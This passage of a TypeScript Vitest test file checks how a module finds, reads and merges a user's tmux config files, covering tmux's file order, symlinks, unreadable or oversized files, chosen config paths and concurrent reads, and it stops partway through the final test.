import {
  appendFile,
  chmod,
  mkdir,
  mkdtemp,
  open,
  readFile,
  realpath,
  rm,
  stat,
  symlink,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { TmuxPrefix } from "./prefix";
import {
  MAX_CONFIG_BYTES,
  canReadConfigFile,
  readTmuxConfig,
  tmuxConfigPaths,
  type TmuxConfigChoices,
  type TmuxConfigLocations,
} from "./tmux-config";
import {
  stockTmuxConfig,
  type TmuxConfig,
  type TmuxEditorEnvironment,
} from "./tmux-keymap";
import type { TmuxAction } from "./types";

// The real functions, with a stat that a test can make slow enough for a
// file to change between the look at its size and the read, a realpath that
// a test can hold back, and an open whose reads a test can count.
vi.mock("node:fs/promises", async (importOriginal) => {
  const actual = await importOriginal<typeof import("node:fs/promises")>();
  return {
    ...actual,
    stat: vi.fn(actual.stat),
    realpath: vi.fn(actual.realpath),
    open: vi.fn(actual.open),
  };
});

const HOME_FILE = ".tmux.conf";
const DOT_CONFIG_FILE = join(".config", "tmux", "tmux.conf");
const XDG_FILE = join("tmux", "tmux.conf");

// Every file of these tests lives in a directory made for the test. home and
// xdg stand in for the home directory and for XDG_CONFIG_HOME, so the real
// home directory of the machine is never read.
let root: string;
let home: string;
let xdg: string;

async function write(path: string, text: string): Promise<void> {
  await mkdir(dirname(path), { recursive: true });
  await writeFile(path, text);
}

const NO_EDITOR: TmuxEditorEnvironment = { visual: undefined, editor: undefined };
const NO_CHOICES: TmuxConfigChoices = { path: "", text: "" };

async function readPrefix(
  locations: TmuxConfigLocations,
): Promise<TmuxPrefix | null> {
  const config = await readTmuxConfig(locations, NO_EDITOR, NO_CHOICES);
  return config.options.prefix;
}

function read(xdgConfigHome: string | undefined = undefined) {
  return readPrefix({ homeDir: home, xdgConfigHome });
}

function setPrefix(key: string): string {
  return `set -g prefix ${key}\n`;
}

function readConfig(
  xdgConfigHome: string | undefined = undefined,
  environment = NO_EDITOR,
): Promise<TmuxConfig> {
  return readTmuxConfig({ homeDir: home, xdgConfigHome }, environment, NO_CHOICES);
}

// With a chosen config file and the Config text setting. tmux's own places
// are the home directory and the XDG directory of the test.
function readWith(choices: Partial<TmuxConfigChoices>): Promise<TmuxConfig> {
  return readTmuxConfig({ homeDir: home, xdgConfigHome: xdg }, NO_EDITOR, {
    ...NO_CHOICES,
    ...choices,
  });
}

function prefixActions(config: TmuxConfig, key: string): TmuxAction[] | undefined {
  return config.tables.prefix.find((binding) => binding.key === key)?.actions;
}

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), "tmux-config-"));
  home = join(root, "home");
  xdg = join(root, "xdg");
  await mkdir(home);
  await mkdir(xdg);
});

afterEach(async () => {
  await rm(root, { recursive: true, force: true });
});

describe("tmuxConfigPaths", () => {
  it("lists the home file, the XDG file and the .config file in tmux's order", () => {
    expect(
      tmuxConfigPaths({ homeDir: "/home/me", xdgConfigHome: "/xdg" }),
    ).toEqual([
      "/home/me/.tmux.conf",
      "/xdg/tmux/tmux.conf",
      "/home/me/.config/tmux/tmux.conf",
    ]);
  });

  it.each([undefined, ""])(
    "leaves the XDG file out when XDG_CONFIG_HOME is %j",
    (xdgConfigHome) => {
      expect(tmuxConfigPaths({ homeDir: "/home/me", xdgConfigHome })).toEqual([
        "/home/me/.tmux.conf",
        "/home/me/.config/tmux/tmux.conf",
      ]);
    },
  );

  it.each(["/home/me/.config", "/home/me/.config/", "/home/me/x/../.config"])(
    "lists the same path only once when XDG_CONFIG_HOME is %s",
    (xdgConfigHome) => {
      expect(tmuxConfigPaths({ homeDir: "/home/me", xdgConfigHome })).toEqual([
        "/home/me/.tmux.conf",
        "/home/me/.config/tmux/tmux.conf",
      ]);
    },
  );

  it("lists no file of a home directory that is not known", () => {
    expect(tmuxConfigPaths({ homeDir: null, xdgConfigHome: "/xdg" })).toEqual([
      "/xdg/tmux/tmux.conf",
    ]);
    expect(tmuxConfigPaths({ homeDir: null, xdgConfigHome: undefined })).toEqual([]);
  });

  it("never lists a system-wide file", () => {
    const paths = tmuxConfigPaths({ homeDir: "/home/me", xdgConfigHome: "/xdg" });

    expect(paths.filter((path) => path.startsWith("/etc"))).toEqual([]);
    expect(paths).toHaveLength(3);
  });
});

describe("readTmuxConfig: the prefix", () => {
  it("finds no prefix when no tmux config exists", async () => {
    expect(await read(xdg)).toBeNull();
  });

  it("reads the prefix from ~/.tmux.conf and writes the home directory as ~", async () => {
    await write(join(home, HOME_FILE), "set-option -g prefix C-a\n");

    expect(await read()).toEqual({
      key: "C-a",
      path: "~/.tmux.conf",
      usable: true,
    });
  });

  it("reads the prefix from ~/.config/tmux/tmux.conf", async () => {
    await write(join(home, DOT_CONFIG_FILE), setPrefix("C-Space"));

    expect(await read()).toEqual({
      key: "C-Space",
      path: "~/.config/tmux/tmux.conf",
      usable: true,
    });
  });

  it("reads the prefix from the XDG file and shows its full path outside the home directory", async () => {
    await write(join(xdg, XDG_FILE), setPrefix("M-a"));

    expect(await read(xdg)).toEqual({
      key: "M-a",
      path: join(xdg, XDG_FILE),
      usable: true,
    });
  });

  it("writes an XDG directory inside the home directory with ~ as well", async () => {
    const inHome = join(home, "settings");
    await write(join(inHome, XDG_FILE), setPrefix("C-a"));

    expect((await read(inHome))?.path).toBe("~/settings/tmux/tmux.conf");
  });

  it("shows the full path of a directory whose name only starts like the home directory", async () => {
    const sibling = `${home}-work`;
    await write(join(sibling, XDG_FILE), setPrefix("C-a"));

    expect((await read(sibling))?.path).toBe(join(sibling, XDG_FILE));
  });

  it("writes ~ for a home directory that is given with a slash at its end", async () => {
    await write(join(home, HOME_FILE), setPrefix("C-a"));

    const prefix = await readPrefix({
      homeDir: `${home}/`,
      xdgConfigHome: undefined,
    });

    expect(prefix?.path).toBe("~/.tmux.conf");
  });

  it("does not read the XDG file when XDG_CONFIG_HOME is not given", async () => {
    await write(join(xdg, XDG_FILE), setPrefix("M-a"));

    expect(await read()).toBeNull();
    expect(await read("")).toBeNull();
  });

  describe("with several files", () => {
    it("lets the XDG file override ~/.tmux.conf", async () => {
      await write(join(home, HOME_FILE), setPrefix("C-a"));
      await write(join(xdg, XDG_FILE), setPrefix("C-s"));

      expect(await read(xdg)).toEqual({
        key: "C-s",
        path: join(xdg, XDG_FILE),
        usable: true,
      });
    });

    it("lets ~/.config/tmux/tmux.conf override the XDG file and ~/.tmux.conf", async () => {
      await write(join(home, HOME_FILE), setPrefix("C-a"));
      await write(join(xdg, XDG_FILE), setPrefix("C-s"));
      await write(join(home, DOT_CONFIG_FILE), setPrefix("C-d"));

      expect(await read(xdg)).toEqual({
        key: "C-d",
        path: "~/.config/tmux/tmux.conf",
        usable: true,
      });
    });

    it("keeps the prefix of an earlier file when the later ones set none", async () => {
      await write(join(home, HOME_FILE), setPrefix("C-a"));
      await write(join(xdg, XDG_FILE), "set -g mouse on\n");
      await write(join(home, DOT_CONFIG_FILE), "bind r set -g prefix C-x\n");

      expect(await read(xdg)).toEqual({
        key: "C-a",
        path: "~/.tmux.conf",
        usable: true,
      });
    });

    it("lets a later file unset the prefix of an earlier one", async () => {
      await write(join(home, HOME_FILE), setPrefix("C-a"));
      await write(join(home, DOT_CONFIG_FILE), "set -gu prefix\n");

      expect(await read()).toBeNull();
    });

    it("names the file of a prefix that bb cannot use", async () => {
      await write(join(home, HOME_FILE), setPrefix("C-a"));
      await write(join(home, DOT_CONFIG_FILE), setPrefix("`"));

      expect(await read()).toEqual({
        key: "`",
        path: "~/.config/tmux/tmux.conf",
        usable: false,
      });
    });
  });

  describe("with one file under two names", () => {
    it("reads it once when XDG_CONFIG_HOME is ~/.config", async () => {
      await write(join(home, DOT_CONFIG_FILE), setPrefix("C-a"));

      expect(await read(join(home, ".config"))).toEqual({
        key: "C-a",
        path: "~/.config/tmux/tmux.conf",
        usable: true,
      });
    });

    it("reads it once, under its first name, when ~/.tmux.conf is a link to it", async () => {
      await write(join(home, DOT_CONFIG_FILE), setPrefix("C-a"));
      await symlink(join(home, DOT_CONFIG_FILE), join(home, HOME_FILE));

      expect(await read()).toEqual({
        key: "C-a",
        path: "~/.tmux.conf",
        usable: true,
      });
    });

    it("reads it once, under its first name, when XDG_CONFIG_HOME is a link to ~/.config", async () => {
      await write(join(home, DOT_CONFIG_FILE), setPrefix("C-a"));
      const link = join(root, "xdg-link");
      await symlink(join(home, ".config"), link);

      expect((await read(link))?.path).toBe(join(link, XDG_FILE));
    });

    it("reads the file that a link points to outside the home directory", async () => {
      const dotfiles = join(root, "dotfiles", "tmux.conf");
      await write(dotfiles, setPrefix("C-a"));
      await symlink(dotfiles, join(home, HOME_FILE));

      expect(await read()).toEqual({
        key: "C-a",
        path: "~/.tmux.conf",
        usable: true,
      });
    });
  });

  describe("with an entry that cannot be read", () => {
    it("skips a missing file and reads the next one", async () => {
      await write(join(home, DOT_CONFIG_FILE), setPrefix("C-a"));

      expect((await read(xdg))?.path).toBe("~/.config/tmux/tmux.conf");
    });

    it("skips a directory in the place of a file", async () => {
      await mkdir(join(home, HOME_FILE));
      await mkdir(join(xdg, XDG_FILE), { recursive: true });

      expect(await read(xdg)).toBeNull();

      await write(join(home, DOT_CONFIG_FILE), setPrefix("C-a"));

      expect((await read(xdg))?.path).toBe("~/.config/tmux/tmux.conf");
    });

    it("skips a link that points nowhere", async () => {
      await symlink(join(root, "gone"), join(home, HOME_FILE));
      await write(join(home, DOT_CONFIG_FILE), setPrefix("C-a"));

      expect((await read())?.path).toBe("~/.config/tmux/tmux.conf");
    });

    it("skips a file that it is not allowed to read when another file sets a prefix", async (context) => {
      if (process.getuid?.() === 0) context.skip();
      const path = join(home, HOME_FILE);
      await write(path, setPrefix("C-x"));
      await chmod(path, 0o000);
      await write(join(home, DOT_CONFIG_FILE), setPrefix("C-a"));

      expect(await read()).toEqual({
        key: "C-a",
        path: "~/.config/tmux/tmux.conf",
        usable: true,
      });
    });

    it("takes a .config that is a file and no folder for no config", async () => {
      await write(join(home, ".config"), "not a folder");

      expect(await readConfig()).toEqual(stockTmuxConfig());
    });

    it("skips a home directory that does not exist", async () => {
      const prefix = await readPrefix({
        homeDir: join(root, "nobody"),
        xdgConfigHome: join(root, "nothing"),
      });

      expect(prefix).toBeNull();
    });

    it("finds no prefix in a file that is not text", async () => {
      await writeFile(join(home, HOME_FILE), Buffer.from([0xff, 0xfe, 0x00, 0x80]));

      expect(await read()).toBeNull();
    });
  });

  describe("with a large file", () => {
    const line = setPrefix("C-a");

    it("reads a file of exactly 1 MiB", async () => {
      expect(MAX_CONFIG_BYTES).toBe(1024 * 1024);
      const padding = "#".repeat(MAX_CONFIG_BYTES - line.length);
      await write(join(home, HOME_FILE), line + padding);

      expect((await read())?.key).toBe("C-a");
    });

    it("does not apply a file that grows past the limit between the look at its size and the read", async () => {
      const path = join(home, HOME_FILE);
      await write(path, line + "#".repeat(MAX_CONFIG_BYTES - line.length));
      const actual = await vi.importActual<typeof import("node:fs/promises")>(
        "node:fs/promises",
      );
      vi.mocked(stat).mockImplementationOnce((async (file: string) => {
        const info = await actual.stat(file);
        await appendFile(path, "\nbind G kill-pane\n");
        return info;
      }) as typeof stat);

      expect(await readConfig()).toEqual({ ...stockTmuxConfig(), unreadable: true });
      expect(await readConfig()).toEqual({ ...stockTmuxConfig(), unreadable: true });
    });

    it("reads no more than one byte past the limit of a file that says that it is empty and holds more", async () => {
      const path = join(home, HOME_FILE);
      await write(path, line + "#".repeat(3 * MAX_CONFIG_BYTES));
      const actual = await vi.importActual<typeof import("node:fs/promises")>(
        "node:fs/promises",
      );
      vi.mocked(stat).mockImplementationOnce((async (file: string) =>
        Object.assign(await actual.stat(file), { size: 0 })) as typeof stat);
      let bytesRead = 0;
      vi.mocked(open).mockImplementationOnce((async (file: string, flags: string) => {
        const handle = await actual.open(file, flags);
        const read = handle.read.bind(handle) as (
          ...given: unknown[]
        ) => Promise<{ bytesRead: number }>;
        handle.read = (async (...given: unknown[]) => {
          const result = await read(...given);
          bytesRead += result.bytesRead;
          return result;
        }) as typeof handle.read;
        return handle;
      }) as typeof open);

      expect(await readConfig()).toEqual({ ...stockTmuxConfig(), unreadable: true });
      expect(bytesRead).toBe(MAX_CONFIG_BYTES + 1);
    });

    it("still reads the other files next to a file that is too large", async () => {
      await write(join(home, HOME_FILE), "#".repeat(MAX_CONFIG_BYTES + 1));
      await write(join(home, DOT_CONFIG_FILE), setPrefix("C-s"));

      expect(await read()).toEqual({
        key: "C-s",
        path: "~/.config/tmux/tmux.conf",
        usable: true,
      });
    });
  });

  it("reads the files again on every call", async () => {
    const path = join(home, HOME_FILE);
    await write(path, setPrefix("C-a"));
    expect((await read())?.key).toBe("C-a");

    await write(path, setPrefix("C-s"));
    expect((await read())?.key).toBe("C-s");

    await rm(path);
    expect(await read()).toBeNull();
  });

  it("answers again once a file that could not be read can be", async (context) => {
    if (process.getuid?.() === 0) context.skip();
    const path = join(home, HOME_FILE);
    await write(path, setPrefix("C-a"));
    await chmod(path, 0o000);
    expect(await readConfig()).toMatchObject({
      options: { prefix: null },
      unreadable: true,
    });

    await chmod(path, 0o600);

    expect(await readConfig()).toMatchObject({
      options: { prefix: { key: "C-a" } },
      unreadable: false,
    });
  });
});

describe("readTmuxConfig", () => {
  const CLOSE: TmuxAction[] = [{ type: "pane.close" }];
  const ZOOM: TmuxAction[] = [{ type: "pane.zoom" }];

  it("answers with stock tmux and no file when no tmux config exists", async () => {
    expect(await readConfig(xdg)).toEqual(stockTmuxConfig());
  });

  it("answers with stock tmux for a home directory that does not exist", async () => {
    const config = await readTmuxConfig(
      { homeDir: join(root, "nobody"), xdgConfigHome: join(root, "nothing") },
      NO_EDITOR,
      NO_CHOICES,
    );

    expect(config).toEqual(stockTmuxConfig());
  });

  it("applies ~/.tmux.conf to stock tmux and names the file with ~", async () => {
    await write(
      join(home, HOME_FILE),
      "unbind C-b\nset -g prefix C-a\nbind C-a send-prefix\nbind g kill-pane\n",
    );

    const config = await readConfig();

    expect(config.files).toEqual(["~/.tmux.conf"]);
    expect(config.unreadable).toBe(false);
    expect(config.options.prefix).toEqual({
      key: "C-a",
      path: "~/.tmux.conf",
      usable: true,
    });
    expect(prefixActions(config, "C-b")).toBeUndefined();
    expect(prefixActions(config, "C-a")).toEqual([
      { type: "prefix.send", second: false },
    ]);
    expect(prefixActions(config, "g")).toEqual(CLOSE);
    expect(prefixActions(config, "c")).toEqual([{ type: "thread.new" }]);
  });

  it("reads the three files in tmux's order, so that the last one decides", async () => {
    await write(join(home, HOME_FILE), "bind g kill-pane\nset -g mouse on\n");
    await write(join(xdg, XDG_FILE), "bind g resize-pane -Z\nbind G kill-pane\n");
    await write(join(home, DOT_CONFIG_FILE), "unbind G\nset -g repeat-time 900\n");

    const config = await readConfig(xdg);

    expect(config.files).toEqual([
      "~/.tmux.conf",
      join(xdg, XDG_FILE),
      "~/.config/tmux/tmux.conf",
    ]);
    expect(prefixActions(config, "g")).toEqual(ZOOM);
    expect(prefixActions(config, "G")).toBeUndefined();
    expect(config.options).toMatchObject({ mouse: true, repeatTimeMs: 900 });
  });

  it("names only the files that exist", async () => {
    await write(join(home, DOT_CONFIG_FILE), "set -g mouse on\n");

    const config = await readConfig(xdg);

    expect(config.files).toEqual(["~/.config/tmux/tmux.conf"]);
    expect(config.options.mouse).toBe(true);
  });

  it("does not read the XDG file when XDG_CONFIG_HOME is not given", async () => {
    await write(join(xdg, XDG_FILE), "bind g kill-pane\n");

    expect(await readConfig()).toEqual(stockTmuxConfig());
  });

  it("reads one file under two names once", async () => {
    await write(join(home, DOT_CONFIG_FILE), "set -g mouse\n");
    await symlink(join(home, DOT_CONFIG_FILE), join(home, HOME_FILE));

    const config = await readConfig(join(home, ".config"));

    expect(config.files).toEqual(["~/.tmux.conf"]);
    expect(config.options.mouse).toBe(true);
  });

  it("takes a config that only sets options, and leaves every stock key", async () => {
    await write(
      join(home, HOME_FILE),
      "setw -g mode-keys vi\nset -g base-index 1\nset -g prefix2 C-s\n",
    );

    const config = await readConfig();

    expect(config.options).toEqual({
      prefix: null,
      prefix2: { key: "C-s", path: "~/.tmux.conf", usable: true },
      modeKeys: "vi",
      mouse: false,
      repeatTimeMs: 500,
      prefixTimeoutMs: 0,
      baseIndex: 1,
    });
    expect(config.tables.copyModeVi).toEqual(stockTmuxConfig().tables.copyModeVi);
    expect(prefixActions(config, "1")).toEqual([{ type: "thread.jump", index: 1 }]);
    expect(prefixActions(config, "0")).toEqual([]);
  });

  it("starts from the editor of the environment it is given", async () => {
    const vim = { visual: undefined, editor: "vim" };

    expect((await readConfig(undefined, vim)).options.modeKeys).toBe("vi");

    await write(join(home, HOME_FILE), "set -g mode-keys emacs\n");

    expect((await readConfig(undefined, vim)).options.modeKeys).toBe("emacs");
  });

  it("never reads a file that source-file names", async () => {
    const other = join(home, "keys.conf");
    await write(other, "bind g kill-pane\n");
    await write(
      join(home, HOME_FILE),
      `source-file ${other}\nsource-file -q ~/keys.conf\nbind r source-file ${other}\n`,
    );

    const config = await readConfig();

    expect(config.files).toEqual(["~/.tmux.conf"]);
    expect(prefixActions(config, "g")).toBeUndefined();
    expect(prefixActions(config, "r")).toEqual([{ type: "config.reload" }]);
  });

  it("says that a file could not be read, and still applies the others", async (context) => {
    if (process.getuid?.() === 0) context.skip();
    const path = join(home, HOME_FILE);
    await write(path, "bind g kill-pane\n");
    await chmod(path, 0o000);
    await write(join(home, DOT_CONFIG_FILE), "bind G resize-pane -Z\n");

    const config = await readConfig();

    expect(config.unreadable).toBe(true);
    expect(config.files).toEqual(["~/.config/tmux/tmux.conf"]);
    expect(prefixActions(config, "g")).toBeUndefined();
    expect(prefixActions(config, "G")).toEqual(ZOOM);
  });

  it("answers with stock tmux, and says so, when the only file may not be read", async (context) => {
    if (process.getuid?.() === 0) context.skip();
    const path = join(home, HOME_FILE);
    await write(path, setPrefix("C-x"));
    await chmod(path, 0o000);

    expect(await readConfig()).toEqual({
      ...stockTmuxConfig(),
      unreadable: true,
    });
  });

  it("says so for a file that is too large, and for a link that goes round in a circle", async () => {
    await write(join(home, HOME_FILE), "#".repeat(MAX_CONFIG_BYTES + 1));

    expect(await readConfig()).toEqual({ ...stockTmuxConfig(), unreadable: true });

    await rm(join(home, HOME_FILE));
    await symlink(join(home, HOME_FILE), join(home, HOME_FILE));

    expect(await readConfig()).toEqual({ ...stockTmuxConfig(), unreadable: true });
  });

  it("does not count a directory or a link that points nowhere as a file that could not be read", async () => {
    await mkdir(join(home, HOME_FILE));
    await mkdir(dirname(join(home, DOT_CONFIG_FILE)), { recursive: true });
    await symlink(join(root, "gone"), join(home, DOT_CONFIG_FILE));

    expect(await readConfig()).toEqual(stockTmuxConfig());
  });

  it("takes a file that is not text for one without commands", async () => {
    await writeFile(join(home, HOME_FILE), Buffer.from([0xff, 0xfe, 0x00, 0x80]));

    expect(await readConfig()).toEqual({
      ...stockTmuxConfig(),
      files: ["~/.tmux.conf"],
    });
  });

  it("reads the files again on every call", async () => {
    const path = join(home, HOME_FILE);
    await write(path, "bind g kill-pane\n");
    expect(prefixActions(await readConfig(), "g")).toEqual(CLOSE);

    await write(path, "bind g resize-pane -Z\n");
    expect(prefixActions(await readConfig(), "g")).toEqual(ZOOM);

    await rm(path);
    expect(await readConfig()).toEqual(stockTmuxConfig());
  });
});

describe("readTmuxConfig with a chosen config file", () => {
  const CLOSE: TmuxAction[] = [{ type: "pane.close" }];
  const NOT_READ = { files: [], unreadable: true, namedFile: true };

  // A file in each of tmux's own places, which must not be read while
  // another file is chosen.
  async function writeUsualFiles(): Promise<void> {
    await write(join(home, HOME_FILE), "bind u kill-pane\n");
    await write(join(xdg, XDG_FILE), "bind x resize-pane -Z\n");
    await write(join(home, DOT_CONFIG_FILE), "set -g prefix C-s\n");
  }

  it("reads the chosen file in the place of tmux's own files", async () => {
    await writeUsualFiles();
    const named = join(root, "elsewhere", "keys.conf");
    await write(named, "bind g kill-pane\nset -g prefix C-a\n");

    const config = await readWith({ path: named });

    expect(config).toMatchObject({
      files: [named],
      unreadable: false,
      namedFile: true,
      pastedText: "none",
    });
    expect(config.options.prefix).toEqual({ key: "C-a", path: named, usable: true });
    expect(prefixActions(config, "g")).toEqual(CLOSE);
    expect(prefixActions(config, "u")).toBeUndefined();
    expect(prefixActions(config, "x")).toEqual(
      stockTmuxConfig().tables.prefix.find((binding) => binding.key === "x")?.actions,
    );
  });

  it.each(["~/dotfiles/tmux.conf", "~/dotfiles/../dotfiles/tmux.conf"])(
    "takes %s for a file in the home directory, and shows it with ~",
    async (path) => {
      await write(join(home, "dotfiles", "tmux.conf"), "bind g kill-pane\n");

      const config = await readWith({ path });

      expect(config.files).toEqual(["~/dotfiles/tmux.conf"]);
      expect(config.unreadable).toBe(false);
      expect(prefixActions(config, "g")).toEqual(CLOSE);
    },
  );

  it("shows a full path inside the home directory with ~ as well", async () => {
    await write(join(home, "keys.conf"), "bind g kill-pane\n");

    const config = await readWith({ path: join(home, "keys.conf") });

    expect(config.files).toEqual(["~/keys.conf"]);
  });

  it("reads a file whose name ends in a blank, and not the file next to it whose name ends without one", async () => {
    await write(join(home, "keys.conf"), "set -g prefix C-a\n");
    await write(join(home, "keys.conf "), "set -g prefix C-s\n");

    const config = await readWith({ path: "~/keys.conf " });

    expect(config).toMatchObject({ files: ["~/keys.conf "], unreadable: false, namedFile: true });
    expect(config.options.prefix?.key).toBe("C-s");
  });

  it.each(["~/keys.conf ", "~/keys.conf\n", " ~/keys.conf"])(
    "drops no blank of the path %j, so it reads no file whose name has none",
    async (path) => {
      await writeUsualFiles();
      await write(join(home, "keys.conf"), "bind g kill-pane\n");

      expect(await readWith({ path })).toMatchObject(NOT_READ);
    },
  );

  it("reads tmux's own files when the path holds only blanks", async () => {
    await writeUsualFiles();

    const config = await readWith({ path: "   " });

    expect(config.namedFile).toBe(false);
    expect(config.files).toEqual([
      "~/.tmux.conf",
      join(xdg, XDG_FILE),
      "~/.config/tmux/tmux.conf",
    ]);
  });

  it("reads the file that a link points to", async () => {
    const target = join(root, "dotfiles", "tmux.conf");
    await write(target, "bind g kill-pane\n");
    await symlink(target, join(home, "linked.conf"));

    const config = await readWith({ path: "~/linked.conf" });

    expect(config.files).toEqual(["~/linked.conf"]);
    expect(prefixActions(config, "g")).toEqual(CLOSE);
  });

  it.each([
    "keys.conf",
    "./keys.conf",
    "../keys.conf",
    "~other/keys.conf",
    "~keys.conf",
    "$HOME/keys.conf",
  ])("does not read the path %s, which is not absolute", async (path) => {
    await writeUsualFiles();
    await write(join(home, "keys.conf"), "bind g kill-pane\n");

    const config = await readWith({ path });

    expect(config).toEqual({ ...stockTmuxConfig(), ...NOT_READ });
  });

  it("counts a missing file as one that could not be read, and falls back to stock tmux and not to tmux's own files", async () => {
    await writeUsualFiles();

    const config = await readWith({ path: join(root, "gone.conf") });

    expect(config).toEqual({ ...stockTmuxConfig(), ...NOT_READ });
  });

  it("cannot read a file in a home directory that is not known, and shows another by its full path", async () => {
    const path = join(home, "dotfiles", "tmux.conf");
    await write(path, "bind g kill-pane\n");
    const locations = { homeDir: null, xdgConfigHome: undefined };

    expect(
      await readTmuxConfig(locations, NO_EDITOR, { path: "~/dotfiles/tmux.conf", text: "" }),
    ).toMatchObject(NOT_READ);
    expect(await readTmuxConfig(locations, NO_EDITOR, { path, text: "" })).toMatchObject({
      files: [path],
      unreadable: false,
    });
  });

  it.each(["~", "~/"])(
    "counts the directory %s as a file that could not be read",
    async (path) => {
      expect(await readWith({ path })).toMatchObject(NOT_READ);
    },
  );

  it("takes the path ~ for the home directory of the server itself, which is read where that is a file", async () => {
    const file = join(root, "home-that-is-a-file");
    await write(file, "bind g kill-pane\n");
    const locations = { homeDir: file, xdgConfigHome: undefined };

    const config = await readTmuxConfig(locations, NO_EDITOR, { path: "~", text: "" });

    expect(config).toMatchObject({ unreadable: false, namedFile: true });
    expect(prefixActions(config, "g")).toEqual(CLOSE);
  });

  it("counts a directory, a link that points nowhere and a file that is too large as files that could not be read", async () => {
    await mkdir(join(home, "folder.conf"));
    await symlink(join(root, "gone"), join(home, "dangling.conf"));
    await write(join(home, "large.conf"), "#".repeat(MAX_CONFIG_BYTES + 1));

    expect(await readWith({ path: "~/folder.conf" })).toMatchObject(NOT_READ);
    expect(await readWith({ path: "~/dangling.conf" })).toMatchObject(NOT_READ);
    expect(await readWith({ path: "~/large.conf" })).toMatchObject(NOT_READ);
  });

  it("reads a chosen file of exactly the size limit", async () => {
    const line = "bind g kill-pane\n";
    await write(
      join(home, "limit.conf"),
      line + "#".repeat(MAX_CONFIG_BYTES - line.length),
    );

    const config = await readWith({ path: "~/limit.conf" });

    expect(config.unreadable).toBe(false);
    expect(prefixActions(config, "g")).toEqual(CLOSE);
  });

  it("counts a file that it is not allowed to read as one that could not be read", async (context) => {
    if (process.getuid?.() === 0) context.skip();
    const path = join(home, "locked.conf");
    await write(path, "bind g kill-pane\n");
    await chmod(path, 0o000);

    expect(await readWith({ path })).toEqual({ ...stockTmuxConfig(), ...NOT_READ });
  });

  it("never reads a file that the chosen file loads with source-file", async () => {
    const other = join(home, "more.conf");
    await write(other, "bind g kill-pane\n");
    await write(join(home, "keys.conf"), `source-file ${other}\n`);

    const config = await readWith({ path: "~/keys.conf" });

    expect(config.files).toEqual(["~/keys.conf"]);
    expect(prefixActions(config, "g")).toBeUndefined();
  });

  it("reads the chosen file again on every call, so that a change to it is picked up", async () => {
    const path = join(home, "keys.conf");
    expect(await readWith({ path })).toMatchObject(NOT_READ);

    await write(path, "bind g kill-pane\n");

    expect(await readWith({ path })).toMatchObject({
      files: ["~/keys.conf"],
      unreadable: false,
    });
  });
});

describe("canReadConfigFile", () => {
  it.each(["keys.conf", "keys.conf ", "keys\t"])(
    "says yes for the file named %j, which readTmuxConfig reads",
    async (name) => {
      await write(join(home, name), "bind g kill-pane\n");
      const path = `~/${name}`;

      expect(await canReadConfigFile(path, home)).toBe(true);
      expect((await readWith({ path })).unreadable).toBe(false);
    },
  );

  it.each(["~/keys.conf ", "~/keys.conf\n", " ~/keys.conf"])(
    "says no for the path %j while only a file without that blank is there, as readTmuxConfig does",
    async (path) => {
      await write(join(home, "keys.conf"), "bind g kill-pane\n");

      expect(await canReadConfigFile(path, home)).toBe(false);
      expect((await readWith({ path })).unreadable).toBe(true);
    },
  );

  it("says yes for a full path, also when the home directory is not known", async () => {
    const path = join(root, "elsewhere", "keys.conf");
    await write(path, "bind g kill-pane\n");

    expect(await canReadConfigFile(path, null)).toBe(true);
  });

  it("says yes for a link to a file", async () => {
    await write(join(root, "dotfiles", "tmux.conf"), "bind g kill-pane\n");
    await symlink(join(root, "dotfiles", "tmux.conf"), join(home, "linked.conf"));

    expect(await canReadConfigFile("~/linked.conf", home)).toBe(true);
  });

  it("says no for a file that is missing, a folder, a link that points nowhere and a file that is too large, as readTmuxConfig does", async () => {
    await mkdir(join(home, "folder.conf"));
    await symlink(join(root, "gone"), join(home, "dangling.conf"));
    await write(join(home, "large.conf"), "#".repeat(MAX_CONFIG_BYTES + 1));

    for (const path of [
      "~/gone.conf",
      "~/folder.conf",
      "~/dangling.conf",
      "~/large.conf",
    ]) {
      expect(await canReadConfigFile(path, home)).toBe(false);
      expect((await readWith({ path })).unreadable).toBe(true);
    }
  });

  it("says yes for a file of exactly the size limit", async () => {
    await write(join(home, "limit.conf"), "#".repeat(MAX_CONFIG_BYTES));

    expect(await canReadConfigFile("~/limit.conf", home)).toBe(true);
  });

  it.each(["keys.conf", "./keys.conf", "~other/keys.conf", "", "   "])(
    "says no for the path %j, which is not absolute",
    async (path) => {
      await write(join(home, "keys.conf"), "bind g kill-pane\n");

      expect(await canReadConfigFile(path, home)).toBe(false);
    },
  );

  it("says no for a file in a home directory that is not known", async () => {
    await write(join(home, "keys.conf"), "bind g kill-pane\n");

    expect(await canReadConfigFile("~/keys.conf", null)).toBe(false);
  });

  it("says no for a file that the bb server is not allowed to read", async (context) => {
    if (process.getuid?.() === 0) context.skip();
    const path = join(home, "locked.conf");
    await write(path, "bind g kill-pane\n");
    await chmod(path, 0o000);

    expect(await canReadConfigFile(path, home)).toBe(false);
  });

  it("looks again on every call", async () => {
    const path = join(home, "keys.conf");
    expect(await canReadConfigFile(path, home)).toBe(false);

    await write(path, "bind g kill-pane\n");

    expect(await canReadConfigFile(path, home)).toBe(true);
  });
});

describe("while the read of a file is under way", () => {
  const CLOSE: TmuxAction[] = [{ type: "pane.close" }];

  // The next look at a path only goes on once the test lets it, as on a
  // mount that is slow to answer.
  async function holdNextLook(): Promise<() => void> {
    const actual = await vi.importActual<typeof import("node:fs/promises")>(
      "node:fs/promises",
    );
    let letGo: () => void = () => {};
    const held = new Promise<void>((resolve) => {
      letGo = resolve;
    });
    vi.mocked(realpath).mockImplementationOnce((async (path: string) => {
      await held;
      return actual.realpath(path);
    }) as typeof realpath);
    return letGo;
  }

  function callsHaveArrived(): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, 0));
  }

  beforeEach(() => {
    vi.mocked(realpath).mockClear();
  });

  it("lets the keys, the keys under another Config text and the settings section wait for one read of the chosen file", async () => {
    const path = join(home, "keys.conf");
    await write(path, "bind g kill-pane\n");
    const letGo = await holdNextLook();

    const keys = readWith({ path });
    const withMouse = readWith({ path, text: "set -g mouse on" });
    const withKey = readWith({ path, text: "bind G kill-pane" });
    const looks = [canReadConfigFile(path, home), canReadConfigFile(path, home)];
    await callsHaveArrived();

    expect(realpath).toHaveBeenCalledTimes(1);

    letGo();

    expect(await Promise.all(looks)).toEqual([true, true]);
    expect((await keys).options.mouse).toBe(false);
    expect(prefixActions(await keys, "G")).toBeUndefined();
    expect((await withMouse).options.mouse).toBe(true);
